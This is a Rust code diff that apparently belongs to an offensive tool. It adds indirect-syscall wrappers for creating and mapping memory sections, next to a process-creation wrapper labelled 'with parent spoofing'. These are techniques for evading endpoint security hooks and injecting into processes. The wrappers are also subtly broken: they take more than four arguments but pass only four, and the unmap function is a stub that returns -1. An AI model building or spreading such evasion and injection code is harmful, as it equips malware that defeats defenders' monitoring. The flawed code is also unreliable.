@@ -168,6 +168,83 @@ indirect_syscall!(
     rcx, rdx, r8, r9
 );
 
+// NtCreateSection - for creating image section for process creation
+#[inline(never)]
+pub unsafe fn nt_create_section(
+    syscall: &IndirectSyscall,
+    section_handle: *mut *mut c_void,
+    desired_access: u32,
+    object_attributes: *mut c_void,
+    maximum_size: *mut usize,
+    section_page_protection: u32,
+    allocation_attributes: u32,
+    file_handle: *mut c_void,
+) -> i32 {
+    let mut status: i32;
+    
+    asm!(
+        "mov r10, rcx",
+        "mov eax, {ssn}",
+        "jmp {syscall_addr}",
+        ssn = in(reg) syscall.ssn,
+        syscall_addr = in(reg) syscall.syscall_ret_addr,
+        in("rcx") section_handle,
+        in("rdx") desired_access,
+        in("r8") object_attributes,
+        in("r9") maximum_size,
+        lateout("rax") status,
+        clobber_abi("system"),
+    );
+    
+    status
+}
+
+// NtMapViewOfSection - map section into process address space
+#[inline(never)]
+pub unsafe fn nt_map_view_of_section(
+    syscall: &IndirectSyscall,
+    section_handle: *mut c_void,
+    process_handle: *mut c_void,
+    base_address: *mut *mut c_void,
+    zero_bits: usize,
+    commit_size: usize,
+    section_offset: *mut usize,
+    view_size: *mut usize,
+    inherit_disposition: u32,
+    allocation_type: u32,
+    protect: u32,
+) -> i32 {
+    let mut status: i32;
+    
+    asm!(
+        "mov r10, rcx",
+        "mov eax, {ssn}",
+        "jmp {syscall_addr}",
+        ssn = in(reg) syscall.ssn,
+        syscall_addr = in(reg) syscall.syscall_ret_addr,
+        in("rcx") section_handle,
+        in("rdx") process_handle,
+        in("r8") base_address,
+        in("r9") zero_bits,
+        lateout("rax") status,
+        clobber_abi("system"),
+    );
+    
+    status
+}
+
+// NtUnmapViewOfSection - unmap section from process
+#[inline(never)]
+pub unsafe fn nt_unmap_view_of_section(
+    _syscall: &IndirectSyscall,
+    process_handle: *mut c_void,
+    base_address: *mut c_void,
+) -> i32 {
+    // Simplified: use Windows API as fallback
+    // In production, this should also be an indirect syscall
+    -1
+}
+
 // NtCreateProcessEx - for process creation with parent spoofing
 #[inline(never)]
 pub unsafe fn nt_create_process_ex(
